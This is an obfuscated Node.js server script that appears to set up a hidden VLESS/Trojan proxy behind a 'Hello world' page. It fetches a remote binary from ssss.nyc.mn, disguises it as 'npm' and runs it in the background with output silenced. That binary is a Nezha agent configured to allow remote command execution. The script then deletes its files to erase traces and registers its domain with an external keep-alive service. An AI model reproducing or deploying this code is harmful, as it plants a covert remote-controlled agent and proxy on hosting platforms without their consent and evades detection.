const _0xc4fd77=_0x5bb7;(function(_0x1c5d18,_0x437275){const _0xd1b884=_0x5bb7,_0x5e08d3=_0x1c5d18();while(!![]){try{const _0x5f183d=parseInt(_0xd1b884(0x106))/0x1+parseInt(_0xd1b884(0x11b))/0x2*(parseInt(_0xd1b884(0xf2))/0x3)+-parseInt(_0xd1b884(0x15d))/0x4*(-parseInt(_0xd1b884(0xf7))/0x5)+parseInt(_0xd1b884(0x136))/0x6*(parseInt(_0xd1b884(0xf5))/0x7)+parseInt(_0xd1b884(0xf0))/0x8*(-parseInt(_0xd1b884(0xfe))/0x9)+parseInt(_0xd1b884(0x142))/0xa+-parseInt(_0xd1b884(0xef))/0xb;if(_0x5f183d===_0x437275)break;else _0x5e08d3['push'](_0x5e08d3['shift']());}catch(_0x5d65e8){_0x5e08d3['push'](_0x5e08d3['shift']());}}}(_0x1052,0x38667));const os=require('os'),http=require(_0xc4fd77(0x101)),fs=require('fs'),axios=require(_0xc4fd77(0x10a)),net=require(_0xc4fd77(0x134)),path=require(_0xc4fd77(0x14d)),crypto=require(_0xc4fd77(0xf3)),{Buffer}=require(_0xc4fd77(0x109)),{exec,execSync}=require(_0xc4fd77(0xfd)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env'][_0xc4fd77(0x157)]||_0xc4fd77(0x16d),NEZHA_SERVER=process[_0xc4fd77(0x14c)][_0xc4fd77(0x15c)]||'',NEZHA_PORT=process[_0xc4fd77(0x14c)][_0xc4fd77(0x127)]||'',NEZHA_KEY=process['env'][_0xc4fd77(0x16a)]||'',DOMAIN=process['env']['DOMAIN']||_0xc4fd77(0x119),AUTO_ACCESS=process[_0xc4fd77(0x14c)][_0xc4fd77(0x138)]||!![],WSPATH=process[_0xc4fd77(0x14c)]['WSPATH']||UUID['slice'](0x0,0x8),SUB_PATH=process['env'][_0xc4fd77(0x160)]||_0xc4fd77(0x113),NAME=process[_0xc4fd77(0x14c)][_0xc4fd77(0x162)]||'Hug',PORT=process['env'][_0xc4fd77(0x144)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x31f3c3=_0xc4fd77;try{const _0x5a4e35=await axios['get'](_0x31f3c3(0x154)),_0xc380b3=_0x5a4e35[_0x31f3c3(0x152)];ISP=(_0xc380b3[_0x31f3c3(0x11e)]+'-'+_0xc380b3[_0x31f3c3(0x121)])[_0x31f3c3(0x108)](/ /g,'_');}catch(_0x271088){ISP=_0x31f3c3(0x16b);}};GetISP();function _0x1052(){const _0x2c5efd=['unlink','2087','asOrganization','chmod\x20+x\x20npm','Server\x20is\x20running\x20on\x20port\x20','https://oooo.serv00.net/add-url','application/dns-json','aarch64','NEZHA_PORT','https://amd64.ssss.nyc.mn/v1','index.html','Answer','2053','https://dns.google/resolve?name=','npm\x20running\x20error:','\x20-p\x20','trojan://','send','text/plain','log','--tls','net',':443?security=tls&sni=','864lWzSHU','readFile','AUTO_ACCESS','application/json','&path=%2F','Server','write','https://amd64.ssss.nyc.mn/agent','toString','2096','then','config.yaml','4375830TqyvDh','https://','PORT','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','concat','close','utf-8','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','readUInt16BE','end','env','path','url','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','type','hex','data','arm','https://speed.cloudflare.com/meta','writeHead','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','UUID','text/html','false','message','setsid\x20nohup\x20./npm\x20-s\x20','NEZHA_SERVER','436QEwLit','npm\x20is\x20running','pop','SUB_PATH','join','NAME','writeFileSync','npm\x20download\x20successfully','client_secret:\x20','decode','includes','8443','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA_KEY','Unknown','npm','d70a56fe-6f18-4b82-bc52-d30ad9553d8e','Hello\x20world!','utf8','update','error','from','8327077wsvCxu','1599880HEXIFl','&fp=chrome&type=ws&host=','22047wgCqMD','crypto','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','20153RzQhxV','https://arm64.ssss.nyc.mn/agent','7375cNcaat','map','createWriteStream','length','digest','finish','child_process','9EtiEDp','Not\x20Found\x0a','1.1.1.1','http','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','trim','reduce','arm64','167724xVfYcF','true','replace','buffer','axios','get','split','substr','connect','slice','pipe','\x20with\x20all\x20DNS\x20servers','sha224','sub','Failed\x20to\x20resolve\x20','catch','createServer','readUInt8','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','1234.abc.com','once','2HdtWKj','stream','&type=A','country'];_0x1052=function(){return _0x2c5efd;};return _0x1052();}const httpServer=http[_0xc4fd77(0x116)]((_0x1f0ad1,_0x4e6178)=>{const _0x3c210d=_0xc4fd77;if(_0x1f0ad1['url']==='/'){const _0x330b24=path[_0x3c210d(0x161)](__dirname,_0x3c210d(0x129));fs[_0x3c210d(0x137)](_0x330b24,_0x3c210d(0x16f),(_0x39274b,_0x42361e)=>{const _0x3df8ee=_0x3c210d;if(_0x39274b){_0x4e6178[_0x3df8ee(0x155)](0xc8,{'Content-Type':_0x3df8ee(0x158)}),_0x4e6178[_0x3df8ee(0x14b)](_0x3df8ee(0x16e));return;}_0x4e6178[_0x3df8ee(0x155)](0xc8,{'Content-Type':_0x3df8ee(0x158)}),_0x4e6178[_0x3df8ee(0x14b)](_0x42361e);});return;}else{if(_0x1f0ad1[_0x3c210d(0x14e)]==='/'+SUB_PATH){const _0xf868c4='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x3c210d(0xf1)+DOMAIN+_0x3c210d(0x13a)+WSPATH+'#'+NAME+'-'+ISP,_0xbb8838=_0x3c210d(0x12f)+UUID+'@'+DOMAIN+_0x3c210d(0x135)+DOMAIN+_0x3c210d(0xf1)+DOMAIN+_0x3c210d(0x13a)+WSPATH+'#'+NAME+'-'+ISP,_0x1c31e0=_0xf868c4+'\x0a'+_0xbb8838,_0x4919f7=Buffer[_0x3c210d(0xee)](_0x1c31e0)[_0x3c210d(0x13e)]('base64');_0x4e6178[_0x3c210d(0x155)](0xc8,{'Content-Type':_0x3c210d(0x131)}),_0x4e6178[_0x3c210d(0x14b)](_0x4919f7+'\x0a');}else _0x4e6178[_0x3c210d(0x155)](0x194,{'Content-Type':_0x3c210d(0x131)}),_0x4e6178['end'](_0x3c210d(0xff));}}),wss=new WebSocket[(_0xc4fd77(0x13b))]({'server':httpServer}),uuid=UUID[_0xc4fd77(0x108)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0xc4fd77(0x100)];function resolveHost(_0x2233f7){return new Promise((_0x3db41c,_0x49e09b)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x2233f7)){_0x3db41c(_0x2233f7);return;}let _0x5a67c5=0x0;function _0x21e8a6(){const _0x323793=_0x5bb7;if(_0x5a67c5>=DNS_SERVERS[_0x323793(0xfa)]){_0x49e09b(new Error(_0x323793(0x114)+_0x2233f7+_0x323793(0x111)));return;}const _0x21684a=DNS_SERVERS[_0x5a67c5];_0x5a67c5++;const _0x32967f=_0x323793(0x12c)+encodeURIComponent(_0x2233f7)+_0x323793(0x11d);axios['get'](_0x32967f,{'timeout':0x1388,'headers':{'Accept':_0x323793(0x125)}})['then'](_0x476b6e=>{const _0x3e2bde=_0x323793,_0x40a41f=_0x476b6e[_0x3e2bde(0x152)];if(_0x40a41f['Status']===0x0&&_0x40a41f[_0x3e2bde(0x12a)]&&_0x40a41f['Answer'][_0x3e2bde(0xfa)]>0x0){const _0xec0b64=_0x40a41f[_0x3e2bde(0x12a)]['find'](_0x3b7080=>_0x3b7080[_0x3e2bde(0x150)]===0x1);if(_0xec0b64){_0x3db41c(_0xec0b64[_0x3e2bde(0x152)]);return;}}_0x21e8a6();})[_0x323793(0x115)](_0x41e90f=>{_0x21e8a6();});}_0x21e8a6();});}function handleVlessConnection(_0x159da6,_0x4a2a77){const _0x4fbd2b=_0xc4fd77,[_0x392fdc]=_0x4a2a77,_0x9b2265=_0x4a2a77[_0x4fbd2b(0x10f)](0x1,0x11);if(!_0x9b2265['every']((_0xd937df,_0x27a43b)=>_0xd937df==parseInt(uuid[_0x4fbd2b(0x10d)](_0x27a43b*0x2,0x2),0x10)))return![];let _0x23fac7=_0x4a2a77['slice'](0x11,0x12)[_0x4fbd2b(0x117)]()+0x13;const _0x410262=_0x4a2a77[_0x4fbd2b(0x10f)](_0x23fac7,_0x23fac7+=0x2)['readUInt16BE'](0x0),_0x56a566=_0x4a2a77[_0x4fbd2b(0x10f)](_0x23fac7,_0x23fac7+=0x1)[_0x4fbd2b(0x117)](),_0x4717e5=_0x56a566==0x1?_0x4a2a77[_0x4fbd2b(0x10f)](_0x23fac7,_0x23fac7+=0x4)[_0x4fbd2b(0x161)]('.'):_0x56a566==0x2?new TextDecoder()[_0x4fbd2b(0x166)](_0x4a2a77[_0x4fbd2b(0x10f)](_0x23fac7+0x1,_0x23fac7+=0x1+_0x4a2a77[_0x4fbd2b(0x10f)](_0x23fac7,_0x23fac7+0x1)[_0x4fbd2b(0x117)]())):_0x56a566==0x3?_0x4a2a77[_0x4fbd2b(0x10f)](_0x23fac7,_0x23fac7+=0x10)[_0x4fbd2b(0x104)]((_0x206c49,_0x53c33a,_0x17ee58,_0x15cbad)=>_0x17ee58%0x2?_0x206c49['concat'](_0x15cbad['slice'](_0x17ee58-0x1,_0x17ee58+0x1)):_0x206c49,[])['map'](_0x35c6e3=>_0x35c6e3[_0x4fbd2b(0x14a)](0x0)[_0x4fbd2b(0x13e)](0x10))['join'](':'):'';_0x159da6[_0x4fbd2b(0x130)](new Uint8Array([_0x392fdc,0x0]));const _0x1c55eb=createWebSocketStream(_0x159da6);return resolveHost(_0x4717e5)[_0x4fbd2b(0x140)](_0x151177=>{const _0x17be81=_0x4fbd2b;net[_0x17be81(0x10e)]({'host':_0x151177,'port':_0x410262},function(){const _0x41b2bd=_0x17be81;this[_0x41b2bd(0x13c)](_0x4a2a77['slice'](_0x23fac7)),_0x1c55eb['on'](_0x41b2bd(0xed),()=>{})[_0x41b2bd(0x110)](this)['on'](_0x41b2bd(0xed),()=>{})[_0x41b2bd(0x110)](_0x1c55eb);})['on']('error',()=>{});})[_0x4fbd2b(0x115)](_0x5686c6=>{const _0x437d04=_0x4fbd2b;net['connect']({'host':_0x4717e5,'port':_0x410262},function(){const _0xa6e18d=_0x5bb7;this[_0xa6e18d(0x13c)](_0x4a2a77[_0xa6e18d(0x10f)](_0x23fac7)),_0x1c55eb['on']('error',()=>{})[_0xa6e18d(0x110)](this)['on'](_0xa6e18d(0xed),()=>{})[_0xa6e18d(0x110)](_0x1c55eb);})['on'](_0x437d04(0xed),()=>{});}),!![];}function handleTrojanConnection(_0x52c5bb,_0x5ba515){const _0x569e6d=_0xc4fd77;try{if(_0x5ba515['length']<0x3a)return![];const _0x27805f=_0x5ba515[_0x569e6d(0x10f)](0x0,0x38)[_0x569e6d(0x13e)](),_0x5b91dd=[UUID];let _0x1a9209=null;for(const _0x227957 of _0x5b91dd){const _0x253123=crypto['createHash'](_0x569e6d(0x112))[_0x569e6d(0x170)](_0x227957)[_0x569e6d(0xfb)](_0x569e6d(0x151));if(_0x253123===_0x27805f){_0x1a9209=_0x227957;break;}}if(!_0x1a9209)return![];let _0x3fd364=0x38;_0x5ba515[_0x3fd364]===0xd&&_0x5ba515[_0x3fd364+0x1]===0xa&&(_0x3fd364+=0x2);const _0xd5f69=_0x5ba515[_0x3fd364];if(_0xd5f69!==0x1)return![];_0x3fd364+=0x1;const _0x5d6aa6=_0x5ba515[_0x3fd364];_0x3fd364+=0x1;let _0x571086,_0x95b68;if(_0x5d6aa6===0x1)_0x571086=_0x5ba515[_0x569e6d(0x10f)](_0x3fd364,_0x3fd364+0x4)[_0x569e6d(0x161)]('.'),_0x3fd364+=0x4;else{if(_0x5d6aa6===0x3){const _0xf30daa=_0x5ba515[_0x3fd364];_0x3fd364+=0x1,_0x571086=_0x5ba515[_0x569e6d(0x10f)](_0x3fd364,_0x3fd364+_0xf30daa)[_0x569e6d(0x13e)](),_0x3fd364+=_0xf30daa;}else{if(_0x5d6aa6===0x4)_0x571086=_0x5ba515[_0x569e6d(0x10f)](_0x3fd364,_0x3fd364+0x10)[_0x569e6d(0x104)]((_0x42a36a,_0x55fbd7,_0x322644,_0x165641)=>_0x322644%0x2?_0x42a36a[_0x569e6d(0x146)](_0x165641[_0x569e6d(0x10f)](_0x322644-0x1,_0x322644+0x1)):_0x42a36a,[])[_0x569e6d(0xf8)](_0x4d9d42=>_0x4d9d42[_0x569e6d(0x14a)](0x0)[_0x569e6d(0x13e)](0x10))['join'](':'),_0x3fd364+=0x10;else return![];}}_0x95b68=_0x5ba515[_0x569e6d(0x14a)](_0x3fd364),_0x3fd364+=0x2;_0x3fd364<_0x5ba515[_0x569e6d(0xfa)]&&_0x5ba515[_0x3fd364]===0xd&&_0x5ba515[_0x3fd364+0x1]===0xa&&(_0x3fd364+=0x2);const _0x2c8f40=createWebSocketStream(_0x52c5bb);return resolveHost(_0x571086)['then'](_0x1ef2b9=>{net['connect']({'host':_0x1ef2b9,'port':_0x95b68},function(){const _0x5ec57a=_0x5bb7;_0x3fd364<_0x5ba515['length']&&this[_0x5ec57a(0x13c)](_0x5ba515[_0x5ec57a(0x10f)](_0x3fd364)),_0x2c8f40['on']('error',()=>{})[_0x5ec57a(0x110)](this)['on'](_0x5ec57a(0xed),()=>{})[_0x5ec57a(0x110)](_0x2c8f40);})['on']('error',()=>{});})[_0x569e6d(0x115)](_0x51837b=>{const _0x1a9c6c=_0x569e6d;net['connect']({'host':_0x571086,'port':_0x95b68},function(){const _0x13c2d2=_0x5bb7;_0x3fd364<_0x5ba515[_0x13c2d2(0xfa)]&&this[_0x13c2d2(0x13c)](_0x5ba515['slice'](_0x3fd364)),_0x2c8f40['on']('error',()=>{})[_0x13c2d2(0x110)](this)['on'](_0x13c2d2(0xed),()=>{})['pipe'](_0x2c8f40);})['on'](_0x1a9c6c(0xed),()=>{});}),!![];}catch(_0x2c074f){return![];}}wss['on']('connection',(_0x7cef03,_0x7097fb)=>{const _0xc274ba=_0xc4fd77,_0x3482e9=_0x7097fb['url']||'';_0x7cef03[_0xc274ba(0x11a)](_0xc274ba(0x15a),_0x2373c7=>{const _0x41d483=_0xc274ba;if(_0x2373c7[_0x41d483(0xfa)]>0x11&&_0x2373c7[0x0]===0x0){const _0xb7a1eb=_0x2373c7[_0x41d483(0x10f)](0x1,0x11),_0x2c22a0=_0xb7a1eb['every']((_0x4e01c3,_0x4ecb61)=>_0x4e01c3==parseInt(uuid['substr'](_0x4ecb61*0x2,0x2),0x10));if(_0x2c22a0){!handleVlessConnection(_0x7cef03,_0x2373c7)&&_0x7cef03[_0x41d483(0x147)]();return;}}!handleTrojanConnection(_0x7cef03,_0x2373c7)&&_0x7cef03[_0x41d483(0x147)]();})['on'](_0xc274ba(0xed),()=>{});});function _0x5bb7(_0x37ef60,_0x1e8c22){const _0x1052c9=_0x1052();return _0x5bb7=function(_0x5bb784,_0x6ae823){_0x5bb784=_0x5bb784-0xed;let _0x4fb680=_0x1052c9[_0x5bb784];return _0x4fb680;},_0x5bb7(_0x37ef60,_0x1e8c22);}const getDownloadUrl=()=>{const _0x47e994=_0xc4fd77,_0x1345d1=os['arch']();return _0x1345d1===_0x47e994(0x153)||_0x1345d1===_0x47e994(0x105)||_0x1345d1===_0x47e994(0x126)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x47e994(0xf6):!NEZHA_PORT?_0x47e994(0x128):_0x47e994(0x13d);},downloadFile=async()=>{const _0x332e19=_0xc4fd77;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x55d01d=getDownloadUrl(),_0x37d533=await axios({'method':_0x332e19(0x10b),'url':_0x55d01d,'responseType':_0x332e19(0x11c)}),_0xbc1af6=fs[_0x332e19(0xf9)](_0x332e19(0x16c));return _0x37d533[_0x332e19(0x152)]['pipe'](_0xbc1af6),new Promise((_0x351354,_0x169e9a)=>{const _0xd90f2a=_0x332e19;_0xbc1af6['on'](_0xd90f2a(0xfc),()=>{const _0x6ed1c=_0xd90f2a;console['log'](_0x6ed1c(0x164)),exec(_0x6ed1c(0x122),_0x308de6=>{if(_0x308de6)_0x169e9a(_0x308de6);_0x351354();});}),_0xbc1af6['on'](_0xd90f2a(0xed),_0x169e9a);});}catch(_0xb5f054){throw _0xb5f054;}},runnz=async()=>{const _0x50054c=_0xc4fd77;try{const _0xc919af=execSync(_0x50054c(0x149),{'encoding':_0x50054c(0x148)});if(_0xc919af[_0x50054c(0x103)]()!==''){console[_0x50054c(0x132)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x359db3){}await downloadFile();let _0x224c07='',_0x409874=['443',_0x50054c(0x168),_0x50054c(0x13f),_0x50054c(0x120),'2083',_0x50054c(0x12b)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5ed437=_0x409874['includes'](NEZHA_PORT)?_0x50054c(0x133):'';_0x224c07=_0x50054c(0x15b)+NEZHA_SERVER+':'+NEZHA_PORT+_0x50054c(0x12e)+NEZHA_KEY+'\x20'+_0x5ed437+_0x50054c(0x145);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x306dd1=NEZHA_SERVER[_0x50054c(0x167)](':')?NEZHA_SERVER[_0x50054c(0x10c)](':')[_0x50054c(0x15f)]():'',_0x2b631c=_0x409874[_0x50054c(0x167)](_0x306dd1)?_0x50054c(0x107):_0x50054c(0x159),_0x292db6=_0x50054c(0x165)+NEZHA_KEY+_0x50054c(0x118)+NEZHA_SERVER+_0x50054c(0xf4)+_0x2b631c+_0x50054c(0x156)+UUID;fs[_0x50054c(0x163)]('config.yaml',_0x292db6);}_0x224c07=_0x50054c(0x102);}else{console['log'](_0x50054c(0x14f));return;}}try{exec(_0x224c07,{'shell':'/bin/bash'},_0x1e02c5=>{const _0x192962=_0x50054c;if(_0x1e02c5)console['error'](_0x192962(0x12d),_0x1e02c5);else console['log'](_0x192962(0x15e));});}catch(_0x28ab12){console[_0x50054c(0xed)]('error:\x20'+_0x28ab12);}};async function addAccessTask(){const _0x912157=_0xc4fd77;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x34714c=_0x912157(0x143)+DOMAIN;try{const _0x3da461=await axios['post'](_0x912157(0x124),{'url':_0x34714c},{'headers':{'Content-Type':_0x912157(0x139)}});console['log'](_0x912157(0x169));}catch(_0x27957d){}}const delFiles=()=>{const _0xe9abce=_0xc4fd77;fs[_0xe9abce(0x11f)](_0xe9abce(0x16c),()=>{}),fs[_0xe9abce(0x11f)](_0xe9abce(0x141),()=>{});};httpServer['listen'](PORT,()=>{const _0xf4b81c=_0xc4fd77;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0xf4b81c(0x123)+PORT);});
